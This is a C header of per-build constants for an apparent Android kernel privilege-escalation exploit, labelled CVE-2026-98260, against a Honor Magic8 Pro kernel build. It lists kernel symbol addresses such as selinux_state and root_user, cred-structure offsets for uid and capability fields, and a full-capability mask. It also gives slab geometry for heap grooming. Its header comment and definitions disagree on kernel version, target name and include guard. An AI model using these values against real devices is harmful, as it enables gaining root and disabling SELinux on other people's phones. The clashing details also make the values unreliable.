/* pc98260_target_6138.h — CVE-2026-98260 per-build constants.
 *
 * Target: Honor Magic8 Pro (magic8pro-6138)
 *   kernel_release = 6.12.38-android16-5-gfde7767f6ef6-abogki481467632-4k
 *   4K pages, VA_BITS=39
 *
 * Derived from:
 *   - targets/magic8pro-6138/vmlinux-6138.elf   (.symtab)
 *   - targets/magic8pro-6138/vmlinux-6138.btf   (.BTF)
 *   - targets/magic8pro-6138/analysis-6138.txt
 *   - 6.18 Mi18P source as method/layout reference only
 *
 * Values marked [inferred] need a live device /proc/slabinfo confirmation.
 */
#ifndef PC98260_TARGET_6138Y_H
#define PC98260_TARGET_6138Y_H

#include <stdint.h>

#define TARGET_NAME          "ylp-w00-6138y"
#define TARGET_KERNEL        "6.12.38-android16-5-g7ae8ec909e03-abogki471017112-4k"
#define TARGET_KERNEL_SHA256 "92b882b87cd5efc5087985d64e1875f3881f9ec837f97df344ba2e8006a0a414"

/* ---- absolute addresses (link-time; add g_slide at runtime) ---------- */
#define LINK_SELINUX_STATE   UINT64_C(0xffffffc0826663c8)  /* selinux_state */
#define LINK_INIT_USER_NS    UINT64_C(0xffffffc082401568)  /* init_user_ns */
#define LINK_ROOT_USER       UINT64_C(0xffffffc0824017e0)  /* root_user    */
#define LINK_INIT_GROUPS     UINT64_C(0xffffffc082402ca8)  /* init_groups  */
#define LINK_INIT_UCOUNTS    UINT64_C(0xffffffc082403178)  /* init_ucounts */

/* ---- kprobe/tracepoint call sites (function-internal; NOT portable) --- */
#define LINK_ALLOC_TIMER     UINT64_C(0xffffffc080d99ef0)  /* do_timer_create+0xac */
#define LINK_ALLOC_CRED      UINT64_C(0xffffffc080b89dc4)  /* prepare_creds+0x2c  */
#define LINK_ALLOC_TASK      UINT64_C(0xffffffc080da63ec)  /* copy_process+0x190 (inferred) */

/* ---- struct geometry (6.12.38 .BTF, byte offsets) ---- */
#define GEO_TASK_CRED        0x900
#define GEO_TASK_REAL_CRED   0x8f8
#define GEO_TASK_COMM        0x910
#define GEO_KITIMER_IT       0x78
#define GEO_KITIMER_SIZE     0x100
#define GEO_KITIMER_STRIDE   0x100
#define GEO_CRED_SIZE        184
#define GEO_CRED_ALLOC_SIZE  192     /* cred_jar cache object size (inferred) */
#define GEO_CRED_UID         0x8
#define GEO_CRED_GID         0xc
#define GEO_CRED_SUID        0x10
#define GEO_CRED_SGID        0x14
#define GEO_CRED_EUID        0x18
#define GEO_CRED_EGID        0x1c
#define GEO_CRED_FSUID       0x20
#define GEO_CRED_FSGID       0x24
#define GEO_CRED_CAP_INH     0x30
#define GEO_CRED_CAP_PERM    0x38
#define GEO_CRED_CAP_EFF     0x40
#define GEO_CRED_CAP_BSET    0x48
#define GEO_CRED_CAP_AMB     0x50
#define GEO_CRED_SECURITY    0x80
#define GEO_CRED_USER        0x88
#define GEO_CRED_USER_NS     0x90
#define GEO_SELINUX_ENFORCE  0
#define GEO_SELINUX_INIT     1
#define GEO_SELINUX_WRITE    (-7)
#define GEO_SELINUX_SIZE     0x80

/* ---- slab geometry ---- */
#define GEO_TASK_OBJSIZE             5696  /* [inferred: same Android16 6.12 base as 61258] */
#define GEO_TASK_OBJ_PER_SLAB        5     /* [inferred] */
#define GEO_TASK_SLAB_PAGES          8     /* [inferred] */
#define GEO_POSIX_TIMER_OBJSIZE      256
#define GEO_POSIX_TIMER_OBJ_PER_SLAB 32    /* [inferred: same 6.12 posix cache layout] */
#define GEO_POSIX_TIMER_SLAB_ORDER   1
#define GEO_PAGE_SIZE                4096
#define GEO_FRAG_PAGE_SIZE           8192

/* ---- kernel addressing ---------------------------------------------- */
#define GEOM_PAGE_OFFSET     UINT64_C(0xffffff8000000000)
#define GEOM_VA_BITS         39
#define GEOM_MEMSTART_PFN    UINT64_C(0x80000) /* [inferred] */
#define GEOM_MEMSTART_ADDR   UINT64_C(0xffffffc0817fa4d8) /* memstart_addr symbol */

/* ---- privilege bitmask ---------------------------------------------- */
#define CAP_FULL             UINT64_C(0x1ffffffffff) /* [inferred cap_last_cap=40] */

/* ---- begin_new_exec cleanup offsets -------------------------------- */
#define BNE_LINK              UINT64_C(0xffffffc080da23e4)
#define BNE_RELEASE_TASK_OFF  0xa48
#define BNE_DOWN_READ_OFF     0x168
#define BNE_TIMERS_EXIT_OFF   0x2a0
#define BNE_EXIT_ITIMERS_OFF  0x2b0

#endif /* PC98260_TARGET_6138_H */
